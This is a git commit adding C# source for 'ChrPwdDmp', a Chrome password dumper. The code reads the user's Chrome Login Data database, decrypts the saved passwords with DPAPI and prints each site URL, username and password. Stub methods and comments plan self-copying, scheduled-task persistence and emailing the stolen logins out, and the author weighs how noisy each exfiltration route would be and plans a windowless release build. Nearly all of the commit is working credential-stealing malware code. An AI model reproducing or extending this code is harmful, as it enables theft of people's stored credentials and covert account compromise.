362c9eb78432d3cfce83d45ca2fdcd8454831ff3
johnmccleary73 <johnmccleary73@gmail.com>
2016-06-18 12:24:08 -0700

    Place holders in place
    Hello

---
+++ ChrPwdDmp/MainWindow.xaml.cs
@@ -0,0 +1,108 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Windows;
+using System.Data.SQLite;
+using System.Security.Cryptography;
+using System.Runtime.Serialization.Formatters.Binary;
+using Microsoft.Win32.TaskScheduler;
+
+namespace ChrPwdDmp
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// 
+    /// Changed the output to the console for testing purposes:
+    /// Right click on the project, "Properties", "Application" tab, change "Output Type" to "Console Application", and then it will also have a console.
+    /// Change this back to "Windows Application" when it is released
+    /// 
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public string loginData;
+
+        public MainWindow()
+        {
+            InitializeComponent();
+            if (LoginDataExists())
+            {
+                string temp = Environment.GetEnvironmentVariable("temp") + @"\Login Data";
+
+                // Copy the file to avoid problems opening
+                File.Copy(loginData, temp, true);
+
+                string chromePasswords = GetChromePasswords(temp);
+                Console.WriteLine(chromePasswords);
+                //Application.Current.Shutdown();
+            }                            
+        }
+
+        private void CopyExe()
+        {
+            // Place holder
+        }
+
+        private void CreateSchTask()
+        {
+            // Place holder
+        }
+
+        private void EmailLoginData()
+        {
+            // Place holder
+            // Might have a couple options...
+            // 1. Use the local Outlook account to send the email (kind of noisy)
+            // 2. or setup and use a Gmail account to send the email (might have ports blocked)
+        }
+
+        private bool LoginDataExists()
+        {
+            string userProfile = Environment.GetEnvironmentVariable("userprofile");
+            //Console.WriteLine("%USERPROFILE% = " + userProfile);
+            loginData = userProfile + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
+            //Console.WriteLine(loginData);
+            return File.Exists(loginData) ? true : false;
+        }
+
+        private string GetChromePasswords(string loginData)
+        {
+            string passwords = null;
+
+            SQLiteConnection myDBConnection = new SQLiteConnection(@"Data Source=" + loginData + ";Version=3;Read Only=True;");
+            myDBConnection.Open();
+
+            string query = @"SELECT action_url, username_value, password_value FROM logins";
+            SQLiteCommand command = new SQLiteCommand(query, myDBConnection);
+            SQLiteDataReader reader = command.ExecuteReader();
+            while (reader.Read())
+            {
+                // Don't bother if there's not a username
+                if ((string)reader["username_value"] != "")
+                {
+                    //Console.WriteLine("action_url:     " + reader["action_url"]);
+                    passwords += "action_url:     " + reader["action_url"] + System.Environment.NewLine;
+                    //Console.WriteLine("username_value: " + reader["username_value"]);
+                    passwords += "username_value: " + reader["username_value"] + System.Environment.NewLine;
+
+                    Byte[] passwordBytes = ProtectedData.Unprotect((Byte[])reader["password_value"], null, DataProtectionScope.CurrentUser);
+                    string passwordValue = System.Text.Encoding.Default.GetString(passwordBytes);
+                    //Console.WriteLine("password_value: " + passwordValue);
+                    passwords += "password_value: " + passwordValue + System.Environment.NewLine;
+
+                    //Console.WriteLine();
+                    passwords += System.Environment.NewLine;
+                }
+            }
+
+            if (passwords != null)
+            {
+                return passwords;
+            }
+            else
+            {
+                return "No passwords found";
+            }   
+        }
+    }
+}
